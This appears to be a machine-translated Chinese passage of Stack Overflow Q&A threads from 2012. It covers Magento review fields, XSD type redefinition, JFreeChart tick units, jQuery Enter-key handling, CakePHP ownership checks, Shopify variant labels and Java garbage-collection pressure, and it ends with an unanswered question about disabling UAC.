现在在数据库的 review_detail 表中添加电子邮件，fname 也转到 app\code\core\Mage\Adminhtml\Block\Review\Edit\Form.php 还添加：

```
$fieldset->addField('fname', 'text', array( // New field 2
'label' => Mage::helper('review')->__('First Name'),
'required' => true,
'name' => 'fname'
));

$fieldset->addField('email', 'text', array( // New field 1
'label' => Mage::helper('review')->__('Email'),
'required' => true,
'name' => 'email'
)); 
```

之前

```
$fieldset->addField('nickname', 'text', array(
'label' => Mage::helper('review')->__('Nickname'),
'required' => true,
'name' => 'nickname'
)); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-04T05:15:18.010

修改Mage核心类有点吓人，以后升级magento核心类会很困难。您可以通过您自己的自定义模块覆盖特定的类（如果您想设置一个，请参阅模块创建者）

模块的config.xml，添加模型重写如下：

```
<global>
    <models>
        <review_mysql4>
            <rewrite>
                <review>[[Your Company]]_[[Your Module]]_Model_Review</review>
            </rewrite>
        </review_mysql4>
    </models>
    ...
</global> 
```

并且指定的类将从您要覆盖的 Magento 核心类扩展：

```
class [[Your Company]]_[[Your Module]]_Model_Review
    extends Mage_Review_Model_Mysql4_Review
{
    protected function _afterSave(Mage_Core_Model_Abstract $object)
    {
     .... 
    }
} 
```

附言。在 magento review_detail 表中添加新字段：

```
$installer = $this;
$installer->startSetup();
$installer->run("ALTER TABLE review_detail ADD COLUMN email VARCHAR(255) NULL");
$installer->endSetup(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T11:10:24.897

最后我解决了它...打开 **app\code\core\Mage\Review\Model\Resource\Review.php**

您会在大约 150 行找到此代码

```
protected function _afterSave(Mage_Core_Model_Abstract $object)
{
$detail = array(
'title' => $object->getTitle(),
'detail' => $object->getDetail(),
'nickname' => $object->getNickname(),
); 
```

添加要添加的新两个字段。

```
protected function _afterSave(Mage_Core_Model_Abstract $object)
{
$detail = array(
'title' => $object->getTitle(),
'detail' => $object->getDetail(),
'nickname' => $object->getNickname(),
'email' => $object->getEmail(), // New field 1
'fname' => $object->getFname(), // New field 2
); 
```

仅此而已.... :) 快乐编码

# xsd - XSD 扩展一个复杂类型

> ID：10084145
> 
> 赞同：3
> 
> 时间：2012-04-10T06:33:22.790
> 
> 标签：xsd

我正在尝试在 XSD 文件中扩展现有的复杂类型。

我创建了一个新的 xsd 文件并将其包含在所有主 XSD 文件的末尾。

我遇到的问题是它似乎添加了我的扩展，但它删除了除asset_abstract 中定义的元素之外的现有元素

我正在尝试做的事情可能吗？

我不想修改的代码

```
<xs:complexType name="Feature_Cadastre_Lot" abstract="false">
<xs:annotation>
  <xs:documentation>Represents the boundary of a titled, or proposed lot</xs:documentation>
</xs:annotation>
<xs:complexContent>
  <xs:extension base="asset_abstract">
    <xs:sequence minOccurs="1" maxOccurs="1">
      <xs:element name="LotNo" type="String_32" minOccurs="1" maxOccurs="1" nillable="false">
        <xs:annotation>
          <xs:documentation>The lot number as described on the originating survey plan</xs:documentation>
        </xs:annotation>
      </xs:element>
      <xs:element name="PlanNo" type="String_32" minOccurs="1" maxOccurs="1" nillable="false">
        <xs:annotation>
          <xs:documentation>The plan number of the originating survey plan.</xs:documentation>
        </xs:annotation>
      </xs:element>
      <xs:element name="CancelledLotPlan" type="String_32" minOccurs="1" maxOccurs="1" nillable="true">
        <xs:annotation>
          <xs:documentation>The lot on plan cancelled by this boundary if applicable.</xs:documentation>
        </xs:annotation>
      </xs:element>
      <xs:element name="TitledArea_sqm" type="Float_Positive_NonZero" minOccurs="1" maxOccurs="1" nillable="false">
        <xs:annotation>
          <xs:documentation>The area in square metres enclosed by the boundary, as described by the survey plan.</xs:documentation>
        </xs:annotation>
      </xs:element>
      <xs:element name="Geometry" type="geometry_area_multipatch_simple" minOccurs="1" maxOccurs="1" nillable="false">
        <xs:annotation>
          <xs:documentation>The geometry of this feature in coordinate space.  May contain holes and islands. Boundaries must consist of straight lines.</xs:documentation>
        </xs:annotation>
      </xs:element>
    </xs:sequence>
  </xs:extension>
</xs:complexContent> 
```

我可以导入代码来扩展方案。

```
 <xs:complexType name="Feature_Cadastre_Lot">
<xs:complexContent>
    <xs:extension base="asset_abstract">
        <xs:sequence>
            <xs:element name="LMS_ID_1" type="String_32" minOccurs="1" maxOccurs="1" nillable="false">
                <xs:annotation>
                    <xs:documentation>The Land Management System ID as defined by the LMS Team</xs:documentation>
                </xs:annotation>
            </xs:element>
            <xs:element name="LMS_ID_2" type="String_32" minOccurs="1" maxOccurs="1" nillable="false">
                <xs:annotation>
                    <xs:documentation>The Land Management System ID as defined by the LMS Team</xs:documentation>
                </xs:annotation>
            </xs:element>
        </xs:sequence>
    </xs:extension>
</xs:complexContent> 
```

好的，我已经创建了一个简单的示例，但我现在仍然无法使用 Visual Studio 让它工作，因为我想确保它不是工具 :)，我仍然无法像你的那样工作 :( 我一定是遗漏了什么。

基本上，我添加了 2 个文件 Master.xsd 和 local.xsd Master 包装了我不能/不想直接修改的远程项目，而 local.xsd 是我们所有站点特定内容的地方（重新定义，因为它被称为）。

大师.xsd

```
 <?xml version="1.0"?>
<xs:schema version="1.0.0" xmlns:xs="http://www.w3.org/2001/XMLSchema" elementFormDefault="qualified" attributeFormDefault="unqualified">
  <xs:include schemaLocation="project.xsd">
  </xs:include>
    <xs:include schemaLocation="local.xsd">
    <xs:annotation>
      <xs:documentation>A File I can add my overwrites to</xs:documentation>
    </xs:annotation>
  </xs:include>
  </xs:schema> 
```

项目.xsd

```
 <?xml version="1.0"?>
<xs:schema version="1.0.0" xmlns:xs="http://www.w3.org/2001/XMLSchema" elementFormDefault="qualified" attributeFormDefault="unqualified">
  <xs:include schemaLocation="remote.xsd">
    <xs:annotation>
      <xs:documentation>A File that contains the complexType I want to add elments to. But not modify otherwise</xs:documentation>
    </xs:annotation>
  </xs:include>
  <xs:element name="Master_Project">
    <xs:annotation>
      <xs:documentation>The Project.</xs:documentation>
    </xs:annotation>
    <xs:complexType>
      <xs:sequence>
        <xs:element name="ProjectData">
            <xs:complexType>
                <xs:sequence>
                <xs:element name="ExistingElement" type="ExistingElementType">
                  <xs:annotation>
                    <xs:documentation>An Existing Element That I would Like To Add To.</xs:documentation>
                  </xs:annotation>
                </xs:element>
              </xs:sequence>
            </xs:complexType>
        </xs:element>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
</xs:schema> 
```

本地.xsd

```
 <?xml version="1.0"?>
<xs:schema version="1.0.0" xmlns:xs="http://www.w3.org/2001/XMLSchema" elementFormDefault="qualified" attributeFormDefault="unqualified">
  <xs:redefine schemaLocation="./remote.xsd">
   <xs:complexType name="ExistingElementType">
      <xs:complexContent>
        <xs:extension base="ExistingElementType">
           <xs:sequence>
             <xs:element name="newTest"/>
            </xs:sequence>
         </xs:extension>
      </xs:complexContent>
   </xs:complexType>
</xs:redefine>
</xs:schema> 
```

远程.xsd

```
<?xml version="1.0"?>
<xs:schema version="1.0.0" xmlns:xs="http://www.w3.org/2001/XMLSchema" elementFormDefault="qualified" attributeFormDefault="unqualified">
<xs:complexType name="ExistingElementType">
   <xs:sequence>
      <xs:element name="someProperty"/>
      <xs:element name="someSecondProperty"/>
   </xs:sequence>
</xs:complexType>
</xs:schema> 
```

我最终在哪里进行所有重新定义。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T13:18:14.457

如果您想将复杂类型的名称保留为“Feature_Cadastre_Lot”**并**使用其他内容对其进行扩展，那么您正在寻找**重新定义**。最终效果是所有对“Feature_Cadastre_Lot”的引用，无论是先前存在的还是新的，都将包括新添加的内容。

如果您希望在某些但不是所有现有内容中使用此功能，则没有解决方案（重新定义是全部或全部）。

重新定义具有以下布局：

```
<xs:redefine schemaLocation="must resolve to your XSD">
  <xs:complexType name="Feature_Cadastre_Lot">
    <xs:complexContent>
      <xs:extension base="Feature_Cadastre_Lot">
        <xs:sequence>
            <xs:element name="LMS_ID_1" type="String_32" minOccurs="1" maxOccurs="1" nillable="false">
                <xs:annotation>
                    <xs:documentation>The Land Management System ID as defined by the LMS Team</xs:documentation>
                </xs:annotation>
            </xs:element>
            <xs:element name="LMS_ID_2" type="String_32" minOccurs="1" maxOccurs="1" nillable="false">
                <xs:annotation>
                    <xs:documentation>The Land Management System ID as defined by the LMS Team</xs:documentation>
                </xs:annotation>
            </xs:element>
        </xs:sequence>
      </xs:extension>
    </xs:complexContent>
  </xs:complexType>
</xs:redefine> 
```

结果将如下所示：

![重新定义类型](../Images/67c8b26fd698f927e89e2705e50776f4.png)

您可以看到突出显示的序列显示了添加的内容。

在 Visual Studio 2010 中，内容也显示 ok：

![VS2010重新定义](../Images/e6a8c6311d3e7f3c99c64d7a6f77bff3.png)

注意底部的第二个序列。

# jfreechart - Jfree图表XY图：我们如何将水平线之间的空间设置为0.3，将垂直线之间的空间设置为0.4？

> ID：10084152
> 
> 赞同：0
> 
> 时间：2012-04-10T06:33:42.100
> 
> 标签：jfreechart

嗨，我正在尝试在 XY Plot 中将 y 轴的水平网格线之间的空间设置为 0.3，将 x 轴的垂直网格线设置为 0.4。

我已经尝试设置宽度和边距，但是我发现 xy 绘图的水平和垂直网格线没有区别。

请让我知道我们如何实现它。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T01:31:29.557

网格线间距遵循`TickUnit`相应轴的间距。您可以更改[此处](https://stackoverflow.com/a/7232680/230513)和下方所示的值。

```
domain.setTickUnit(new NumberTickUnit(0.4));
range.setTickUnit(new NumberTickUnit(0.3)); 
```

# javascript - 当我按 Enter 键时如何单击某个按钮

> ID：10084155
> 
> 赞同：0
> 
> 时间：2012-04-10T06:34:02.443
> 
> 标签：javascript, html, button

我正在使用 JSF 2.0 构建一个 webApp。我最近添加了一个 jQuery 对话框，它有一个取消和一个 OK 按钮，但无论我试图让它在按下 Enter 键时单击 OK 按钮，我都做不到。

对话框的 javascript 如下所示：

```
$("#goToPatientForm").dialog({
            autoOpen: false,
            height: 190,
            width: 380,
            modal: true,
            resizable: false,
            buttons: {
                "Go": function() {
                    //CLICKS THE HIDDEN SAVE BUTTON SO IT CAN LOOK PRETTY.
                    //if(getMode()=="new"){
                        $('.goTo').click(); 
                        $(this).dialog( "close" );
                },
                Cancel: function() {
                    resetFormFields();  
                    $(this).dialog( "close" );
                }
            },
            close: function() {
                resetFormFields();
                //allFields.val("").removeClass("ui-state-error");          
            }
        }); 
```

对话框如下所示：

```
<div id="goToPatientForm"  title="Go To a Form">

                <ul class="appnitro">
                    <li>
                        <h:outputLabel styleClass="description" for="pId">Patient Id: </h:outputLabel>
                        <div>
                            <h:inputText id="pId" value="#{dashboardBB.patientId}" size="30"></h:inputText>                         
                        </div>
                    </li>
                    <li style="visibility: hidden;">    
                        <h:commandButton id="goToButton" action="#{dashboardBB.actionGoTo}" styleClass="goTo" value="Go" type="submit"></h:commandButton>
                    </li>
                </ul>
                            </div> 
```

如您所见，我已经给 OK 按钮一个 type="submit" 并且我什至在我的页面中添加了 javascript：

```
$("j_idt11:pId").keyup(function(event){    
            if(event.keyCode == 13){    
                alert("sometext");
                $("j_idt11:goToButton").click();     
                } 
            }); 
```

但它不起作用，它只是重新加载页面，但它没有点击按钮的动作。任何想法为什么它不能那样工作？再次提前感谢！

图片：![截屏](../Images/6a485400670981259e4d84bdb9ce9925.png)

编辑：这是呈现的 html

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><link type="text/css" rel="stylesheet" href="/miloWeb/faces/javax.faces.resource/theme.css?ln=primefaces-aristo" /><script type="text/javascript" src="/miloWeb/faces/javax.faces.resource/jquery/jquery.js?ln=primefaces&amp;v=3.2"></script><script type="text/javascript" src="/miloWeb/faces/javax.faces.resource/primefaces.js?ln=primefaces&amp;v=3.2"></script>
        <title>MILO</title>

        <link rel="stylesheet" type="text/css" href="/miloWeb/css/redmond/jquery-ui-1.8.11.custom.css" media="screen" />
        <link rel="stylesheet" type="text/css" href="/miloWeb/css/style.css" media="screen" />
        <link rel="stylesheet" type="text/css" href="/miloWeb/css/view.css" media="screen" />
        <link rel="stylesheet" type="text/css" href="/miloWeb/css/ezmark.css" media="screen" />

        <!--[if IE]>
            <style type="text/css"> 
                /* place css fixes for all versions of IE in this conditional comment */
                .milo #content { zoom: 1; }
                /* the above proprietary zoom property gives IE the hasLayout it may need to avoid several bugs */
            </style>
        <![endif]-->

        <script type="text/javascript" src="/miloWeb/js/jquery.ezmark.js"></script>
        <script type="text/javascript" src="/miloWeb/js/jquery.maskedinput.js"></script>
        <script type="text/javascript" src="/miloWeb/js/random.js"></script>
        <script type="text/javascript" src="/miloWeb/js/jquery-ui-1.8.11.custom.min.js"></script>

        <script type="text/javascript">
            $(document).ready(function(){
                $(".button").button();
            });

            function loading(){
                $( "#loadingPopUp" ).dialog( "open" );
                return false;
            }

            function unloading(){
                $( "#loadingPopUp" ).dialog( "close" );
                return false;
            }
        </script>

            <script>
            $(function() {

            $("#dialog:ui-dialog").dialog("destroy");

            $("#goToPatientForm").dialog({
                autoOpen: false,
                height: 190,
                width: 380,
                modal: true,
                resizable: false,
                buttons: {
                    "Go": function() {
                        //CLICKS THE HIDDEN SAVE BUTTON SO IT CAN LOOK PRETTY.
                        //if(getMode()=="new"){
                            $('.goTo').click(); 
                            $(this).dialog( "close" );
                    },
                    Cancel: function() {
                        resetFormFields();  
                        $(this).dialog( "close" );
                    }
                },
                close: function() {
                    resetFormFields();
                    //allFields.val("").removeClass("ui-state-error");          
                }
            });

            $("#goToPopUp")
            .click(function() {
                $( "#goToPatientForm" ).dialog( "open" );
            });

            });

            function resetFormFields(){
                document.getElementById("j_idt11:pId").value = "";
            }

            </script></head><body class="milo">
<form id="j_idt11" name="j_idt11" method="post" action="/miloWeb/faces/pages/dashboard/dashboard.xhtml" class="miloForm" enctype="multipart/form-data">
<input type="hidden" name="j_idt11" value="j_idt11" />

            <div id="container">
                <div id="header"><html xmlns="http://www.w3.org/1999/xhtml"><body>

    <div>
        <h1 class="headerTitle">MILO Chart</h1>
        <div class="headerTreadmark">Medical Information Leading Operations Chart</div>
        <div class="clear"></div>
    </div>

    <div id="headerInfo"><table>
<tbody>
<tr><td></td></tr></tbody>
</table>

    </div><div id="j_idt11:j_idt42"></div><script id="j_idt11:j_idt42_s" type="text/javascript">PrimeFaces.cw('AjaxStatus','widget_j_idt11_j_idt42',{id:'j_idt11:j_idt42'});widget_j_idt11_j_idt42.bindCallback('ajaxStart',function(){loading();});widget_j_idt11_j_idt42.bindCallback('ajaxSuccess',function(){unloading();});</script></body>
</html>
                </div>

                <div id="sidebar1"><div>
    <h3 style="margin-top: 40px;">Navigation</h3>

    <div id="navigation">
        <ul class="top-level">
            <li>
<script type="text/javascript" src="/miloWeb/faces/javax.faces.resource/jsf.js?ln=javax.faces"></script>
<a id="j_idt11:linkLogin" href="#" onclick="mojarra.jsfcljs(document.getElementById('j_idt11'),{'j_idt11:linkLogin':'j_idt11:linkLogin'},'');return false">Log Out</a></li>
            <li><a id="j_idt11:linkDashboard" href="#" onclick="mojarra.jsfcljs(document.getElementById('j_idt11'),{'j_idt11:linkDashboard':'j_idt11:linkDashboard'},'');return false">Dashboard</a></li>
            <li><a id="j_idt11:linkScheduler" href="#" onclick="mojarra.jsfcljs(document.getElementById('j_idt11'),{'j_idt11:linkScheduler':'j_idt11:linkScheduler'},'');return false">Scheduler</a></li>
            <li>
                <ul class="sub-level">
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                </ul>
            </li>
            <li>
                <ul class="sub-level">
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                </ul>
            </li>
            <li>
                <ul class="sub-level">
                    <li></li>
                    <li></li>
                    <li></li>
                </ul>
            </li>
            <li></li>

    </ul>
<h3 style="margin-top: 40px;">Opened Encounter</h3>
<div id="navigation2">
    <ul class="top-level">
            <li></li>
            <li></li>
            <li>
                <ul class="sub-level">
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                </ul>
            </li>
            <li></li>
            <li></li>
            <li>
                <ul class="sub-level">
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                </ul>
            </li>
            <li></li>
    </ul>
</div>
</div>

</div>
                        <!-- end #sidebar1 -->              
                </div>
                <br />
                <br />
                <div id="content">

            <div id="goToPatientForm" title="Go To a Chart">

                    <ul class="appnitro">
                        <li><label for="j_idt11:pId" class="description">
Patient Id: </label>
                            <div><input id="j_idt11:pId" type="text" name="j_idt11:pId" size="30" />                            
                            </div>
                        </li>
                        <li style="visibility: hidden;"><input id="j_idt11:goToButton" type="submit" name="j_idt11:goToButton" value="Go" class="goTo" />
                        </li>
                    </ul>
                    <p class="validateTips">Type in the Patient Id of the chart you wish to open.</p>
            </div>

            <h2>Dashboard</h2>
            <div>
            <center>
                <table cellspacing="0" cellpadding="3" width="520" style="position: relative; top: 100px;">
                    <tr>
                        <td align="center"><a id="j_idt11:linkLoginDash" href="#" onclick="mojarra.jsfcljs(document.getElementById('j_idt11'),{'j_idt11:linkLoginDash':'j_idt11:linkLoginDash'},'');return false"><img src="/miloWeb/images/schedulerIcon1.1.png" alt="Scheduler" /></a></td>
                        <td align="center"><a id="j_idt11:link2" href="#" onclick="mojarra.jsfcljs(document.getElementById('j_idt11'),{'j_idt11:link2':'j_idt11:link2'},'');return false"><img src="/miloWeb/images/newIcon1.1.png" alt="New Patient" /></a></td>
                        <td align="center"><a id="j_idt11:link3" href="#" onclick="jsf.util.chain(this,event,'return false;','mojarra.jsfcljs(document.getElementById(\'j_idt11\'),{\'j_idt11:link3\':\'j_idt11:link3\'},\'\')');return false"><img src="/miloWeb/images/goToIcon1.1.png" alt="Go To Patient" id="goToPopUp" /></a></td>
                        <td align="center"><a id="j_idt11:link4" href="#" onclick="mojarra.jsfcljs(document.getElementById('j_idt11'),{'j_idt11:link4':'j_idt11:link4'},'');return false"><img src="/miloWeb/images/searchIcon1.1.png" alt="Search screen" /></a></td>
                        <td align="center"><a id="j_idt11:link5" href="#" onclick="mojarra.jsfcljs(document.getElementById('j_idt11'),{'j_idt11:link5':'j_idt11:link5'},'');return false"><img src="/miloWeb/images/settingsIcon1.2.png" alt="Settings" /></a></td>

                    </tr>
                    <tr>
                        <td align="center">Scheduler</td>
                        <td align="center">New</td>
                        <td align="center">Go To</td>
                        <td align="center">Search</td>
                        <td align="center">Settings</td>
                    </tr>
                </table>
            </center>
            </div>
                </div>

                <br class="clear" />

                <div id="footer"><div id="template_footer_id" style="text-align: center;">&copy; 2012 Bravo Technologies.
</div>
                </div>
            </div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="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" autocomplete="off" />
</form></body>

</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T06:47:23.777

请尝试此代码

```
$('body').keyup(function(e) {
   if ($('#goToPatientForm').is(':visible') && e.which == 13) {
      //stuff
   }
}); 
```

希望这对你有帮助。

# php - 如何在 CakePHP 2 中只编辑自己的数据？

> ID：10084158
> 
> 赞同：0
> 
> 时间：2012-04-10T06:34:12.130
> 
> 标签：php, cakephp

如何使注册用户只能编辑自己的数据而不能编辑其他人。设置 ACL 时（aro 和 aco）。我的设置：

类用户扩展 AppModel {

```
public function bindNode($user) {

    return array('model' => 'Group', 'foreign_key' => $user['User']['group_id']);

} 
```

类 AppController 扩展控制器 {

```
public $components = array(
    'Acl',
    'Auth' => array(
        'authorize' => array(
            'Actions' => array('actionPath' => 'controllers')
        )
    ),
    'Session'
); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:59:20.967

您应该将该`isAuthorized`方法添加到您的控制器。在此方法中，您检查用户是否有权使用他们传递的参数执行他们尝试执行的操作。你可以使用这样的代码：

```
switch ($this->action) {
    case 'delete':
    case 'edit':
        // id of what they are trying to edit
        $this->Topic->id = $this->params['pass'][0];
        // id of the owner of what they are trying to edit
        $ownerId = $this->Topic->field('user_id');

        $userId = $this->Auth->user('id');
        if ($ownerId == $userId) {
            // allow users to edit or delete their own topics
            return TRUE;
        } else {
            // allow admin group to edit any topic
            return $this->Auth->user('group') == 'admin';
        }
} 
```

如果您想使用 Cake 的 ACL 系统来检查权限，而不是像“用户是管理员组的成员”这样的硬编码检查，请参阅此处的教程：http: [//jonisalonen.com/2010/role-based-acl-in -cakephp/](http://jonisalonen.com/2010/role-based-acl-in-cakephp/) 虽然它是为 Cake 1.3 编写的，但我没有检查是否有重大差异。

# shopify - 如果有颜色变化，Shopify 将文本添加到产品标题

> ID：10084161
> 
> 赞同：0
> 
> 时间：2012-04-10T06:34:33.303
> 
> 标签：shopify

我有一个**shopify**商店，我正在尝试添加类似的东西

“如果产品有可用的颜色变化，则在标题下添加“更多颜色可用””

如果它没有多种颜色可用，则不要添加任何东西。

有点像这样：[http ://www.jcrew.com/mens_category/pants.jsp](http://www.jcrew.com/mens_category/pants.jsp)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T19:21:15.913

将其添加到标题下或您希望通知出现的任何位置：

```
{% if product.options.size > 1 %}
<p>More Colors Available</p>
{% endif %} 
```

# java - 连续插入LinkedList时如何处理内存泄漏？

> ID：10084170
> 
> 赞同：-1
> 
> 时间：2012-04-10T06:35:27.743
> 
> 标签：java, android, memory-leaks, garbage-collection

我有以下函数，它从连续运行的线程的 run() 中连续调用。

```
private LinkedList<short[]> playerData = new LinkedList<short[]>();

public synchronized void setPlayerData(short[] buffer) {
        // Log.i(LOG_TAG, "Inside setData..");
        playerData.addLast(buffer);
        if (playerData.size() > 10) {
            // Log.i(LOG_TAG, "playerData not empty");
            playerData.removeFirst();
        }
    } 
```

现在DDMS 的**分配跟踪器**说很多对象是在 addLast() 内部创建的（实际上是在 addLastImpl() 内部），因此我想明确删除这些数组，以便它们在堆中始终有足够的内存。现在，

1.  System.gc() 选项无济于事，因为每次调用 setPlayerData() 时都会同时调用它。
2.  GC_CONCURRENT 占用了所有的 CPU 周期，因为应用程序对时间非常敏感，即使是几毫秒的延迟也是不可接受的。

有关 LogCat 信息，请参阅[链接](https://stackoverflow.com/questions/10070189/how-do-i-stop-gc-concurrent-running-so-frequently)，这是我解决整个 synarion 的另一个问题。在这个线程中，我只是试图通过将它分成一组小问题来解决这个更大的问题。

**一个可能的解决方案**一个可能的解决方案是通过删除不需要的数组来显式释放内存空间。但是在 Java 中，我们如何释放由操作符创建的数组`new`呢？IE

```
short[] buffer = new short[320];
// do some operation on buffer
/// now how can I explicitly free memory by deleting the buffer, when its job is over.. 
```

我知道有垃圾收集来处理所有这些事情。但在我的应用程序中，**GC_CONCURRENT**一直在吃光。其他进程因此而被饿死。如果我能够显式释放内存（即在 C++ 中删除），那就太好了。您可以在此处查看 LogCat 信息...[关于我的问题的详细问题](https://stackoverflow.com/questions/10070189/how-do-i-stop-gc-concurrent-running-so-frequently)

**编辑 2** 3\. 将数组分配给 null

这有什么帮助？空数组将被安排到垃圾收集中，这是我想避免的，因为该方法是从一个线程连续调用的（每 20 毫秒）。如果我将数组分配给 null，GC_FOR_MALLOC 消息将填充 LogCat ...

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T07:04:30.047

您的问题不会通过显式删除对象来解决......基本上是因为在 Java 中没有办法做到这一点。

如果您*确实*为 CMS 收集器创建了太多垃圾来处理，那么唯一的解决方案是使用对象池来回收`buffer`对象，而不是将它们丢弃在地板上让 GC 处理。但是，您需要注意不要用其他人替换您当前的问题：

*   回收的对象可能需要“清理”（归零）。
*   设计不佳的对象池可能会导致内存泄漏。
*   设计不佳的对象池可能是并发瓶颈。
*   设计不佳的对象池会增加 GC 开销，尤其是当您使用太小的堆运行时。

另一方面，您真正的问题可能是您的堆对于您尝试运行的应用程序来说太小了。如果你跑得太接近极限，GC 每次都不会回收很多垃圾。由于运行 GC 的成本与 NON-garbage 的数量成正比，因此很容易看出，随着堆接近满，GC 的效率是非线性的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-10T06:39:30.663

只需在使用后将对象设置为**NULL ，***垃圾收集器*就会自动处理它。实际上，当代码无法访问您的对象时，垃圾收集器就会启动，因此它会破坏它们以释放空间。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-10T06:36:29.730

Java 没有删除操作符。当代码部分不再使用它们时，垃圾收集器会自动销毁对象。

也就是说，当一个对象变得无法访问时，垃圾收集器会销毁该对象并释放相关的内存。

我阅读了编辑，也许您可​​以使用 byte[] 缓冲池解决您的问题。所以垃圾收集器不需要一直对缓冲区进行垃圾处理。

私有 LinkedList playerData = new LinkedList();

```
public synchronized void setPlayerData(short[] buffer) {
  // Log.i(LOG_TAG, "Inside setData..");
  playerData.addLast(buffer);
  if (playerData.size() > 10) {
    // Log.i(LOG_TAG, "playerData not empty");
    byte[] buffer = playerData.removeFirst();
    // here return the buffer to the pool to reuse it
  } 
```

  }

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-10T06:42:43.830

如果您在使用垃圾收集器时遇到问题，最好的办法是分配更少的新内存。一种方法是使用[对象池](http://en.wikipedia.org/wiki/Object_pool_pattern)。基本上，重用一个不再需要的缓冲区，而不是创建一个新缓冲区。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-10T06:46:44.323

Java 中没有“等价”运算符。系统在后台执行垃圾回收。没有显式的方法调用可以保证立即释放内存。

# vb.net - 通过 VB.net 禁用 UAC win7 和 Vista？

> ID：10084173
> 
> 赞同：0
> 
> 时间：2012-04-10T06:35:39.087
> 
> 标签：vb.net, uac

我已经构建了一个防病毒软件，但问题是当 Windows 启动时会为用户显示 UAC 消息，以便让他们从中了解。那么如何在 bith windows Vista 和 win 7 上关闭它呢？或者让我的软件成为 Windows 的安全软件？

* * *

